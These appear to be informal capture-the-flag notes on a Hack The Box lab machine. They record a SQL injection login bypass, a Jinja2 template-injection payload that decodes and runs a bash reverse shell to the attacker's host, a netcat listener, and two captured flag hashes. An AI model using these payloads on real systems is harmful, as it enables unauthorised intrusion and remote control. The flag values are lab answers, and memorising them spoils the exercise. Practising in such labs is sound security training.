at 10.129.85.136/login
can try for sqli

using `admin or 1=1--`

we got hte admin page

there is one 
http://internal-administration.goodgames.htb/

since we can acess it now then add to /etc/hosts

by looking at user login admin and superadministrator

{{cycler.__init__.__globals__.os.popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNy80NDQ0IDA+JjE= | base64 -d | bash').read()}}

└─$ echo -n 'bash -i >& /dev/tcp/10.10.14.17/4444 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNy80NDQ0IDA+JjE=
                                                                                
┌──(misthios㉿kali)-[~/Downloads]
└─$ nc -nlvp 4444
listening on [any] 4444 ...

dcebc8d4ef9397ad9036c0eb9f36bea9

only volume mount is there nothing else, 

075cbfa6e2f8a12e8024c7b1b08a4909 

cant seem to know the mumbo jumbo of docker